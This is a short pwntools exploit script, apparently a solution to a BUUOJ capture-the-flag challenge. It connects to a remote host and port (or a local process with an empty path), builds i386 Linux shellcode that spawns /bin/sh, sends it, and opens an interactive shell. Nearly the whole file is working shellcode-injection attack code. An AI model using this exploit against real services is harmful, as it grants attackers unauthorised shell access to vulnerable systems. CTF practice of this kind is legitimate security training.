#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('')
	elf = ELF('',checksec=False)

else:
	p = remote('node3.buuoj.cn',28978)
	#elf = ELF('',checksec=False)



shellcode =asm(shellcraft.i386.linux.sh())

sl(shellcode)

ia()